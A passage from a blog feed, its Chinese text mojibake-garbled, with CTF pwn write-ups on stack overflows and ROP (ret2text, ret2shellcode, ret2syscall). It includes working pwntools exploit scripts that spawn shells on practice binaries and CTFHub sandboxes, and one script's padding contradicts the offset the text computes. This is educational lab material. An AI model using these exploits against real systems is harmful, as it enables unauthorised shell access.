class="hljs-variable">x600d20</span>)</span><br><span class="hljs-variable">p.sendline</span>(<span class="hljs-variable">payload_1</span>)<br><br><span class="hljs-variable">payload_2</span> = <span class="hljs-string">&quot;LIBC_FATAL_STDERR_=1&quot;</span><br><span class="hljs-variable">p.sendline</span>(<span class="hljs-variable">payload_2</span>)<br><br><span class="hljs-variable">print</span> <span class="hljs-variable">p.recvall</span>()<br></code></pre></td></tr></table></figure><hr><p>åŸæ¥æ ˆæº¢å‡ºä¸æ˜¯æƒ³è±¡ä¸­çš„è¾£ä¹ˆç®€å•æ</p><p>æ ˆä¸Šçš„ä¸œè¥¿ç»ˆäºæ•´ç†å¥½å™œğŸ˜Š</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>æ ˆ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>çœŸçš„å¾ˆèœèœçš„ROP</title>
    <link href="/2023/06/21/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/"/>
    <url>/2023/06/21/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/</url>
    
    <content type="html"><![CDATA[<p>æ ˆä¸Šçš„ç®€å•å°ç©æ„ä»¬</p><span id="more"></span><hr><p>éšç€ NX ä¿æŠ¤çš„å¼€å¯ï¼Œä»¥å¾€ç›´æ¥å‘æ ˆæˆ–è€…å †ä¸Šç›´æ¥æ³¨å…¥ä»£ç çš„æ–¹å¼éš¾ä»¥ç»§ç»­å‘æŒ¥æ•ˆæœã€‚æ”»å‡»è€…ä»¬ä¹Ÿæå‡ºæ¥ç›¸åº”çš„æ–¹æ³•æ¥ç»•è¿‡ä¿æŠ¤ï¼Œç›®å‰ä¸»è¦çš„æ˜¯ ROP(Return Oriented Programmingï¼Œé¢å‘è¿”å›ç¼–ç¨‹ï¼‰ï¼Œå…¶ä¸»è¦æ€æƒ³æ˜¯åœ¨<strong>æ ˆç¼“å†²åŒºæº¢å‡ºçš„åŸºç¡€ä¸Šï¼Œåˆ©ç”¨ç¨‹åºä¸­å·²æœ‰çš„å°ç‰‡æ®µ( gadgets )æ¥æ”¹å˜æŸäº›å¯„å­˜å™¨æˆ–è€…å˜é‡çš„å€¼ï¼Œä»è€Œæ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚</strong></p><p>æ‰€è°“ gadgets å°±æ˜¯ä»¥ ret ç»“å°¾çš„æŒ‡ä»¤åºåˆ—ï¼Œé€šè¿‡è¿™äº›æŒ‡ä»¤åºåˆ—ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹æŸäº›åœ°å€çš„å†…å®¹ï¼Œæ–¹ä¾¿æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚</p><p><strong>å®æ–½ROPçš„æ¡ä»¶</strong></p><ul><li>ç¨‹åºå­˜åœ¨æ ˆæº¢å‡ºï¼Œä¸”å¯ä»¥æ§åˆ¶è¿”å›åœ°å€</li><li>å¯ä»¥æ‰¾åˆ°æ»¡è¶³ç¨‹åºçš„ gadgets ä»¥åŠç›¸åº”çš„ gadgets çš„åœ°å€</li></ul><blockquote><p>éƒ½æ˜¯copyæ¥çš„ï¼‰çœ‹åˆ°æœ‰çš„äººè¯´è¿™ä¸ªå«â€œé¢å‘è¿”å›åœ°å€â€ç¼–ç¨‹å“ˆå“ˆã€‚</p></blockquote><h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><p>ret2text å³æ§åˆ¶ç¨‹åºæ‰§è¡Œç¨‹åºæœ¬èº«å·²æœ‰çš„çš„ä»£ç (.text)ï¼Œæ¯”å¦‚<code>system(&quot;/bin/sh&quot;)</code>æˆ–è€…<code>system(&quot;cat flag&quot;)</code>ã€‚æˆ‘ä»¬éœ€è¦åšçš„å°±æ˜¯æŠŠè¿™äº›ä»£ç æ®µçš„è°ƒç”¨åœ°å€è¦†ç›–åˆ°è¿”å›åœ°å€ä¸Šã€‚</p><p>æˆ‘ä»¬åœ¨æ§åˆ¶ç¨‹åºæ‰§è¡Œçš„æ—¶å€™ä¹Ÿå¯ä»¥æ§åˆ¶ç¨‹åºæ‰§è¡Œå¥½å‡ æ®µä¸ç›¸é‚»çš„å·²æœ‰ä»£ç ï¼Œè¿™æ˜¯æˆ‘ä»¬éœ€è¦çŸ¥é“å¯¹åº”è¿”å›çš„ä»£ç çš„ä½ç½®ã€‚ç¨‹åºå¦‚æœå¼€å¯äº†æŸäº›ä¿æŠ¤ï¼Œæˆ‘ä»¬å°±éœ€è¦æƒ³åŠæ³•å»ç»•è¿‡å®ƒã€‚</p><h4 id="ğŸŒ°-1"><a href="#ğŸŒ°-1" class="headerlink" title="ğŸŒ°_1:"></a>ğŸŒ°_1:</h4><p>ç‚¹å‡»ä¸‹è½½: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">ret2text</a></p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-25_17-14-08.png"></p><p>ä½¿ç”¨idaåç¼–è¯‘mainå‡½æ•°ï¼Œå‘ç°gets()è¯­å¥ï¼Œå¯ä»¥åˆ©ç”¨æ ˆæº¢å‡º</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-25_17-30-17.png"></p><p>è€Œåæˆ‘ä»¬åœ¨secureä¸­å¯ä»¥æ‰¾åˆ°è°ƒç”¨<code>system(&#39;&quot;/bin/sh&quot;)</code>çš„ä»£ç ï¼Œå¦‚æœæˆ‘ä»¬æ§åˆ¶ç¨‹åºè¿”å›åˆ°è¿™ä¸ªæŒ‡ä»¤ï¼Œå°±å¯ä»¥è·å¾—ç³»ç»Ÿçš„shell</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-25_17-31-37.png"></p><p>æŸ¥çœ‹ä»£ç åœ°å€ä¸º0x0804863Aï¼Œæ¥ä¸‹æ¥æ„é€ playloadã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2text&#x27;</span>)<br>target = <span class="hljs-number">0x804863a</span><br>sh.sendline(<span class="hljs-string">&#x27;A&#x27;</span> * (<span class="hljs-number">0x6c</span>+<span class="hljs-number">4</span>) + p32(target))<br>sh.interactive()<br></code></pre></td></tr></table></figure><h4 id="ğŸŒ°-2"><a href="#ğŸŒ°-2" class="headerlink" title="ğŸŒ°_2:"></a>ğŸŒ°_2:</h4><p>æ¥è‡ªCTFHUBçš„ret2text ï¼Œæˆ‘ä¸çŸ¥é“æ€ä¹ˆå¤åˆ¶é¢˜ç›®é“¾æ¥ï¼Œè‡ªå·±ç‚¹è¿›å»æ‰¾å­<a href="https://www.ctfhub.com/#/skilltree">CTFHub</a></p><p>æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_14-47-25.png"></p><p>æ‹–è¿›32ä½IDAåç¼–è¯‘å‘ç°mainå‡½æ•°å­˜åœ¨getsæ ˆæº¢å‡ºæ¼æ´</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_14-51-25.png"></p><p>shift+F12æ‰“å¼€å­—ç¬¦ä¸²çª—å£å‘ç°&#x2F;bin&#x2F;shè¯­å¥</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_14-56-54.png"></p><p>å»åˆ°å¯¹åº”çš„è¯­å¥éƒ¨åˆ†å¯ä»¥å‘ç°è¯¥ç¨‹åºå°†&#x2F;bin&#x2F;shæ”¾åˆ°äº†rdiåï¼Œå¹¶ä¸”è°ƒç”¨äº†sysytem</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_15-00-09.png"></p><blockquote><p>64ä½ç³»ç»Ÿä¸­rdiï¼Œrsiï¼Œrdxï¼Œrcxï¼Œr8ï¼Œr9ä½œä¸ºè°ƒç”¨å‡½æ•°çš„å‰6ä¸ªå‚æ•°ï¼Œå¦‚æœå‚æ•°å¤šäº6ä¸ªï¼Œå…¶ä½™å‚æ•°æ”¾å…¥æ ˆä¸­ã€‚ä¸æ­¤å¯¹æ¯”ï¼Œ32ä½ç³»ç»Ÿä¸­ç”±äºå¯„å­˜å™¨æœ‰é™ï¼Œè°ƒç”¨å‡½æ•°æ—¶å‚æ•°éƒ½æ”¾å…¥æ ˆä¸­</p></blockquote><p>æ‰¾ä¸€ä¸ªå˜é‡åŒå‡»å¯ä»¥çœ‹åˆ°å„ä¸ªå˜é‡å¯¹åº”çš„è™šæ‹Ÿå†…å­˜åœ°å€ï¼Œæ„é€ playloadå°±å¯ä»¥å…ˆç”¨0x70ä¸ªè‡ªèŠ‚å¡«æ»¡så˜é‡ï¼Œå†ç”¨8ä¸ªå­—èŠ‚å¡«æ»¡rï¼Œæœ€ååŠ ä¸Š&#x2F;bin&#x2F;shçš„åœ°å€ã€‚</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_15-06-55.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&#x27;challenge-e20ddfc12b209019.sandbox.ctfhub.com&#x27;</span>, <span class="hljs-number">34749</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x70</span> + <span class="hljs-number">8</span>) + p64(<span class="hljs-number">0x4007B8</span>)<br>io.sendlineafter(<span class="hljs-string">&#x27;Welcome to CTFHub ret2text.Input someting:\n&#x27;</span>, payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><blockquote><p>â€˜+4â€™ æ˜¯å› ä¸º32ä½ç¨‹åºè¦è¦†ç›–çš„ebpæ˜¯å››ä¸ªå­—èŠ‚ï¼Œ64ä½ç¨‹åºéœ€è¦è¦†ç›–å…«å­—èŠ‚çš„rbp</p></blockquote><h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><p>å°±æ˜¯ç¯¡æ”¹æ ˆå¸§ä¸Šçš„è¿”å›åœ°å€ä¸ºæ”»å‡»è€…æ‰‹åŠ¨ä¼ å…¥çš„shellcodeæ‰€åœ¨ç¼“å†²åŒºåœ°å€ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨pwntoolsä¸­çš„shellcraft.sh()ç¼–å†™shellcodeã€‚</p><p>åœ¨æ ˆæº¢å‡ºçš„åŸºç¡€ä¸Šï¼Œè¦æƒ³æ‰§è¡Œ shellcodeï¼Œéœ€è¦å¯¹åº”çš„ binary åœ¨è¿è¡Œæ—¶ï¼Œshellcode æ‰€åœ¨çš„åŒºåŸŸå…·æœ‰å¯æ‰§è¡Œæƒé™ã€‚</p><h4 id="ğŸŒ°-1-1"><a href="#ğŸŒ°-1-1" class="headerlink" title="ğŸŒ°_1:"></a>ğŸŒ°_1:</h4><p>ç‚¹å‡»ä¸‹è½½é¢˜ç›®: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2shellcode</a></p><p>æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯ï¼š</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-04-15_10-40-56.png"></p><p>è¿›å…¥mainå‡½æ•°åç¼–è¯‘ä¸€ä¸‹ï¼š</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-04-15_10-46-07.png"></p><p>å‘ç°getså’Œstrncpyå­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ï¼Œä½†ç³»ç»Ÿæ²¡æœ‰ç°æˆçš„â€˜bin&#x2F;shâ€™æŒ‡ä»¤ç»™æˆ‘ä»¬ç”¨ã€‚æˆ‘ä»¬è¦è‡ªå·±å†™ğŸ¥²</p><p>é‚£æ€ä¹ˆå†™å‘¢ï¼Ÿè¿™æ—¶å°±è¦è¯·å‡ºæˆ‘ä»¬çš„å¾—åŠ›åŠ©æ‰‹pwntoolsï¼Œåœ¨pwntoolsä¸‹å¯ä»¥è‡ªåŠ¨ç”Ÿæˆshellcodeè„šæœ¬ã€‚</p><p>getsè·å¾—è¾“å…¥çš„så˜é‡ï¼Œå¹¶å°†å…¶å¤åˆ¶åˆ°buf2å¤„ã€‚åŒå‡»buf2å¯ä»¥è·³è½¬åˆ°å…¶æ‰€åœ¨ä½ç½®ï¼Œæˆ‘ä»¬å‘ç°buf2åœ¨.bssæ®µï¼Œæ‰€åœ¨æ®µåœ°å€ä¸º0x0804a080</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-04-15_10-49-27.png"></p><p>è°ƒè¯•ä¸‹ç¨‹åºï¼Œçœ‹çœ‹è¿™ä¸€ä¸ª bss æ®µæ˜¯å¦å¯æ‰§è¡Œï¼Œæ˜¾ç¤ºrwxpå°±æ˜¯å¯ä»¥ã€‚</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-04-15_11-02-42.png"></p><p>æœ‰æƒé™å°±æ„å‘³ç€æˆ‘ä»¬å¯ä»¥å°†shellcodeé€šè¿‡strncpyå‡½æ•°æ”¾è¿›buf2è¿™ä¸ªåŒºåŸŸï¼Œåœ¨è§¦å‘æº¢å‡ºåå°†è¿”å›åœ°å€æŒ‡å‘buf2è¿™é‡Œå³å¯æ‹¿åˆ°shellã€‚</p><p>ç¡®å®šè¦è¦†ç›–çš„ return address çš„åç§»é‡ç›¸å¯¹äºæ ˆé¡¶ä¸º 112 ä¸ªå­—èŠ‚ã€‚</p><p>EXP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2shellcode&#x27;</span>)<br><br>shellcode = asm(shellcraft.sh())<br>buf2_addr = <span class="hljs-number">0x804a080</span><br><br>sh.sendline(shellcode.ljust(<span class="hljs-number">112</span>, <span class="hljs-string">b&#x27;A&#x27;</span>) + p32(buf2_addr))<br>sh.interactive()<br></code></pre></td></tr></table></figure><h4 id="ğŸŒ°-2-1"><a href="#ğŸŒ°-2-1" class="headerlink" title="ğŸŒ°_2:"></a>ğŸŒ°_2:</h4><p>è¿˜æ˜¯CTFHubçš„é¢˜ç›®ã€‚æ”¾è¿›ubuntuæŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯ï¼š</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_20-00-41.png"></p><p>NX disabledzï¼Œå³å°†shellcodeæ”¾åœ¨æ•°æ®æ®µï¼Œå³å¯æ‰§è¡Œ</p><p>å‡ºç°äº†ä¸€ä¸ªæ–°çš„å˜é‡RWXï¼</p><p>ç”¨IDAåç¼–è¯‘é¢˜ç›®mainå‡½æ•°å‘ç°æ ˆæº¢å‡ºæ¼æ´</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_20-03-42.png"></p><p>æˆ‘ä»¬å¯ä»¥çŸ¥é“bufç›¸å¯¹äºebpçš„åç§»é‡æ˜¯0x10ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¡«å……(0x10+8)çš„æ•°æ®ã€‚</p><p>åŒå‡»bufæŸ¥çœ‹ç¨‹åºä¸­çš„å˜é‡ä¿¡æ¯</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-04-14_20-33-36.png"></p><p>rå³ä¸ºè¿”å›åœ°å€ï¼Œæœ‰0x8çš„åç§»é‡ï¼Œæ‰€ä»¥æ€»å…±éœ€è¦å¡«å……çš„æ•°æ®é•¿åº¦æ˜¯ (0x10+0x8+0x8)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&#x27;challenge-a0bc34814de46f67.sandbox.ctfhub.com&#x27;</span>, <span class="hljs-number">37477</span>)<br>io.recvuntil(<span class="hljs-string">b&#x27;[&#x27;</span>)<br>buf_address = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&#x27;]&#x27;</span>)[:-<span class="hljs-number">1</span>].decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), <span class="hljs-number">16</span>)<br>log.success(<span class="hljs-string">&#x27;buf_address =&gt; %s&#x27;</span> % <span class="hljs-built_in">hex</span>(buf_address).upper())<br>shellcode_address = buf_address+<span class="hljs-number">0x20</span> <span class="hljs-comment"># bufä¸rbpçš„è·ç¦»0x10 + rbpçš„å®½åº¦0x8 + è¿”å›åœ°å€çš„é•¿åº¦0x8</span><br>log.success(<span class="hljs-string">&#x27;buf_address =&gt; %s&#x27;</span> % <span class="hljs-built_in">hex</span>(shellcode_address).upper())<br>shellcode = asm(shellcraft.sh())<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span> + <span class="hljs-number">4</span>) + p64(shellcode_address) + shellcode<br>io.recv()<br>io.sendline(payload)<br>io.interactive()     <br></code></pre></td></tr></table></figure><blockquote><p>è¿™ä¹Ÿå¤ªæ·±å¥¥äº†æ²¡ææ‡‚ï¼Œæœ‰ç¼˜å†è¯´</p></blockquote><h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><p>ret2syscallå³æ§åˆ¶ç¨‹åºæ‰§è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œä»è€Œè·å–shellã€‚å‰ææ˜¯ç¨‹åºéœ€è¦æœ‰int 0x80è¿™æ ·çš„ç³»ç»Ÿè°ƒç”¨çš„gadget.</p><p>åœ¨ret2shellcodeçš„æƒ…å¢ƒä¸‹ï¼Œå¦‚æœå¼€å¯äº†NXï¼Œé‚£æˆ‘ä»¬å†™åˆ°æ ˆä¸­çš„shellcodeå°±ä¼šè¢«CPUæŠ¥é”™è€Œä¸å¯æ‰§è¡Œã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨ret2syscallçš„æ–¹æ³•ã€‚</p><p>ret2syscallå°±æ˜¯æŒ‡é€šè¿‡æ‰‹æœºå¸¦æœ‰retæŒ‡ä»¤çš„æŒ‡ä»¤ç‰‡æ®µæ‹¼æ¥æˆæˆ‘ä»¬éœ€è¦çš„shellcodeã€‚</p><blockquote><p>ret æŒ‡ä»¤å¯ä»¥ç†è§£ä¸ºå–æ ˆé¡¶çš„æ•°æ®ä½œä¸ºä¸‹æ¬¡è·³è½¬çš„ä½ç½®ï¼Œå³ eip&#x3D;[esp]  esp&#x3D;[esp+4]</p><p>æˆ–è€…ç†è§£ä¸º pop eipï¼Œjmp   </p><p>å–æ ˆé¡¶æ•°æ®ä½œä¸ºä¸‹æ¬¡è·³è½¬çš„ä½ç½®ï¼Œç„¶åè·³è½¬;</p><p>åŒç†callä¹Ÿå¯ä»¥ç†è§£ä¸º push rip, jmp  </p><p>å°†callæŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€å‹å…¥æ ˆï¼Œç„¶åè·³è½¬</p></blockquote><h4 id="ğŸŒ°"><a href="#ğŸŒ°" class="headerlink" title="ğŸŒ°:"></a>ğŸŒ°:</h4><p> bamboofox ä¸­çš„ ret2syscall </p><p>é¦–å…ˆæ£€æµ‹ç¨‹åºå¼€å¯çš„ä¿æŠ¤ï¼š</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_15-47-19.png"></p><p>æŸ¥çœ‹å…¶æºç å¯»æ‰¾åˆ©ç”¨ç‚¹ï¼š</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_15-48-31.png"></p><p>main å‡½æ•°é‡Œæœ‰ gets å¯ä»¥å®ç°æ ˆæº¢å‡ºï¼Œè®¡ç®—åç§»é‡ä¸º112ã€‚</p><p>æ¥ä¸‹æ¥è¿›è¡Œç³»ç»Ÿè°ƒç”¨æ„é€ ï¼Œåˆ©ç”¨ROPgadgetæŸ¥æ‰¾å¯¹åº”çš„gadgetï¼š</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-23-31.png"></p><p>é€‰æ‹©0x080bb196çš„è¿™æ®µ</p><p>åŒæ ·ï¼Œæ‰¾åˆ°å…¶ä»–çš„gadgets</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-26-17.png"></p><p>è¿™é‡Œå¯ä»¥åŒæ—¶æ§åˆ¶ä¸‰ä¸ªå¯„å­˜å™¨ï¼Œæˆ‘ä»¬é€‰å®ƒ</p><p>é€‰å¥½æ‰€æœ‰çš„gadgetså°±æ‹¼æ¥èµ·æ¥æ„é€ payloadå°±å¥½å–½</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = process(<span class="hljs-string">&#x27;/var/run/vmblock-fuse/blockdir/OMFuQ4/rop&#x27;</span>)  //è¿™æ–‡ä»¶æˆ‘ç›´æ¥æ‹–è¿›å»çš„æ–‡ä»¶åœ°å€å¥½é•¿<br><br>pop_edx_ecx_ebx = <span class="hljs-number">0x0806eb90</span><br>binsh = <span class="hljs-number">0x080be408</span><br>pop_eax = <span class="hljs-number">0x080bb196</span><br>int_0x80 = <span class="hljs-number">0x08049421</span><br><br>payload = flat([<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">112</span>, pop_edx_ecx_ebx, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, binsh,pop_eax, <span class="hljs-number">0xb</span>, int_0x80])<br><br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h4 id="å…³äºlinuxç³»ç»Ÿè°ƒç”¨çš„å®ç°"><a href="#å…³äºlinuxç³»ç»Ÿè°ƒç”¨çš„å®ç°" class="headerlink" title="å…³äºlinuxç³»ç»Ÿè°ƒç”¨çš„å®ç°"></a>å…³äºlinuxç³»ç»Ÿè°ƒç”¨çš„å®ç°</h4><h5 id="ç³»ç»Ÿè°ƒç”¨çš„æ­¥éª¤"><a href="#ç³»ç»Ÿè°ƒç”¨çš„æ­¥éª¤" class="headerlink" title="ç³»ç»Ÿè°ƒç”¨çš„æ­¥éª¤"></a>ç³»ç»Ÿè°ƒç”¨çš„æ­¥éª¤</h5><p>Linuxçš„ç³»ç»Ÿè°ƒç”¨éœ€è¦é€šè¿‡ int 80 å®ç°ï¼Œç”¨ç³»ç»Ÿè°ƒç”¨å·æ¥åŒºåˆ†å…¥å£å‡½æ•°ã€‚æ“ä½œç³»ç»Ÿå®ç°è°ƒç”¨çš„åŸºæœ¬è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ul><li>åº”ç”¨ç¨‹åºè°ƒç”¨åº“å‡½æ•°</li><li>APIå°†ç³»ç»Ÿè°ƒç”¨å·å­˜å…¥EAXï¼Œç„¶åé€šè¿‡ä¸­æ–­è°ƒç”¨æ—¶ç³»ç»Ÿè¿›å…¥å†…æ ¸æ€</li><li>å†…æ ¸ä¸­çš„ä¸­æ–­å¤„ç†å‡½æ•°æ ¹æ®ç³»ç»Ÿè°ƒç”¨å·ï¼Œè°ƒç”¨åˆ°å¯¹åº”çš„å†…æ ¸å‡½æ•°ï¼ˆç³»ç»Ÿè°ƒç”¨ï¼‰</li><li>ç³»ç»Ÿè°ƒç”¨å®Œæˆç›¸åº”çš„åŠŸèƒ½ï¼Œå°†è¿”å›å€¼å­˜å…¥EAXï¼Œè¿”å›åˆ°ä¸­æ–­å¤„ç†å‡½æ•°</li><li>ä¸­æ–­å¤„ç†å‡½æ•°è¿”å›åˆ°API</li><li>APIå°†EAXè¿”å›ç»™åº”ç”¨ç¨‹åº</li></ul><blockquote><p>ç³»ç»Ÿè°ƒç”¨å·ï¼š</p><p>åœ¨Linuxç³»ç»Ÿä¸­ï¼Œæ¯ä¸ªç³»ç»Ÿè°ƒç”¨éƒ½è¢«èµ‹äºˆä¸€ä¸ªç³»ç»Ÿè°ƒç”¨å·ã€‚ç³»ç»Ÿè°ƒç”¨å·ä¸€æ—¦åˆ†é…å°±ä¸èƒ½å†æœ‰ä»»ä½•å˜æ›´ï¼Œå¦åˆ™ç¼–è¯‘å¥½çš„åº”ç”¨ç¨‹åºå°±ä¼šå´©æºƒï¼›æ­¤å¤–ï¼Œå¦‚æœä¸€ä¸ªç³»ç»Ÿè°ƒç”¨è¢«åˆ é™¤ï¼Œå®ƒæ‰€å ç”¨çš„ç³»ç»Ÿè°ƒç”¨å·ä¹Ÿä¸å…è®¸è¢«å›æ”¶åˆ©ç”¨ã€‚è¿™æ ·ï¼Œé€šè¿‡ç³»ç»Ÿè°ƒç”¨å·å°±å¯ä»¥å…³è”ç³»ç»Ÿè°ƒç”¨ã€‚</p><p>æ¯”å¦‚32ä½ä¸‹è°ƒç”¨ execve(â€œ&#x2F;bin&#x2F;shâ€,NULL,NULL) ï¼ŒLinuxç³»ç»Ÿè°ƒç”¨é€šè¿‡int 0x80æŒ‡ä»¤å¼€å§‹ç³»ç»Ÿè°ƒç”¨ï¼Œexceveå¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨å·æ˜¯0xb</p></blockquote><h5 id="ä¸¾ä¸ªæ —å­ğŸŒ°ï¼š"><a href="#ä¸¾ä¸ªæ —å­ğŸŒ°ï¼š" class="headerlink" title="ä¸¾ä¸ªæ —å­ğŸŒ°ï¼š"></a>ä¸¾ä¸ªæ —å­ğŸŒ°ï¼š</h5><p>å‡½æ•°<code>execve(&quot;/bin/sh&quot;,null,null)</code></p><p>å…¶å‡½æ•°è°ƒç”¨è¿‡ç¨‹åº”è¯¥æ˜¯ï¼š</p><ul><li>ç³»ç»Ÿè°ƒç”¨å·å­˜å…¥EAXï¼Œå³eaxåº”è¯¥æ˜¯0xb</li><li>ä¾æ¬¡ä¼ å…¥ä¸‰ä¸ªå‚æ•°ï¼Œå³ebxæŒ‡å‘&#x2F;bin&#x2F;shçš„åœ°å€æˆ–è€…shçš„åœ°å€ï¼›ecxä¸º0ï¼›edxä¸º0</li></ul><p>æˆ‘ä»¬å¯ä»¥çŸ¥é“ç³»ç»Ÿåœ¨è°ƒç”¨æ—¶ä¼šç”¨åˆ°eaxï¼Œebxï¼Œecxï¼Œedxå››ä¸ªå¯„å­˜å™¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°†ä»¥ä¸Šçš„å†…å®¹å†™ä¸º<code>int 0x80(eax,ebx,ecx,edx)</code>ã€‚åªè¦æŠŠå¯¹åº”çš„å‚æ•°æ”¾åˆ°ç›¸åº”çš„å¯„å­˜å™¨ä¸­ï¼Œå†æ‰§è¡Œint 